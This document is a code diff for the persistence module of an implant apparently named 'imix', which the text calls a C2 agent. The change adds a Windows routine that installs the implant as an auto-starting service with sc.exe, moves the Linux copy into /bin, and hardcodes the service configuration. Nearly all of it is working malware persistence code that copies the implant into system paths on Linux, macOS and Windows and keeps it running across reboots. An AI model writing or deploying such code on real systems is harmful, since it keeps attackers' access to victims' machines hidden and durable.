@@ -202,13 +202,27 @@ def launch_daemon(service_name, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.macho", executable_path)
     sys.shell("chmod +x "+executable_path)
-    sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")
+    sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
+
+def windows_service_manager(service_name, service_display_name, service_description, executable_path):
+    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path+" displayname="+service_display_name+" start= auto type= own")
+    if 'ERROR' in create_res['stdout'] or create_res['stderr'] != "":
+        print("Failed to create service:\n"+create_res+"\n")
+        print("\n")
+        return
+
+    start_res = sys.shell("sc.exe start "+service_name)
+    if 'ERROR' in start_res['stdout'] or start_res['stderr'] != "":
+        print("Failed to start service:\n"+start_res+"\n")
+        print("\n")
+        return
+
 
 def persist_service(service_name, service_desc, executable_name, executable_args):
     src_path = process.info()['exe']
     if sys.is_linux():
-        executable_path = "/usr/local/bin/"+executable_name
+        executable_path = "/bin/"+executable_name
         file.copy(src_path, executable_path)
         if is_using_systemd():
             systemd(service_name, service_desc, executable_path, executable_args)
@@ -218,6 +232,10 @@ def persist_service(service_name, service_desc, executable_name, executable_args
         executable_path = "/var/root/"+executable_name
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
+    elif sys.is_windows():
+        executable_path = "C:\\ProgramData\\"+executable_name+".exe"
+        file.copy(src_path, executable_path)
+        windows_service_manager(service_name, service_name, service_desc, executable_path)
     else:
         print("OS not supported")
 
@@ -230,7 +248,7 @@ def parse_and_persist(config_data):
             conf['name'],
             conf['description'],
             conf['executable_name'],
-            "-c "+input_params['custom_config']+" "+conf['executable_args'],
+            "",
         )
 
 """
@@ -240,37 +258,20 @@ by the imix agent. The imix binary itself will be copied to the install
 location. The original imix binary will still exist so you may wish to delete
 it after running the install.
 
-./imix install -c /etc/imix-config.json
-
-{
-    "service_configs": [
-        {
-            "name": "imix",
-            "description": "Imix c2 agent",
-            "executable_name": "imix",
-            "executable_args": ""
-        }
-    ],
-    "target_forward_connect_ip": "127.0.0.1",
-    "target_name": "test1234",
-    "callback_config": {
-        "interval": 4,
-        "jitter": 1,
-        "timeout": 4,
-        "c2_configs": [
+./imix install
+"""
+def main():
+    config_data ={
+        "service_configs": [
             {
-                "priority": 1,
-                "uri": "http://127.0.0.1:80/grpc"
+                "name": "imix",
+                "description": "Imix c2 agent",
+                "executable_name": "imix",
+                "executable_args": ""
             }
         ]
     }
-}
-"""
-def main():
-    if 'custom_config' in input_params:
-        config_data = crypto.from_json(file.read(input_params['custom_config']))
-        parse_and_persist(config_data)
-    else:
-        print("Please specify a config")
+    parse_and_persist(config_data)
+    print("Implant copied, you may now delete this binary.")
 
 main()
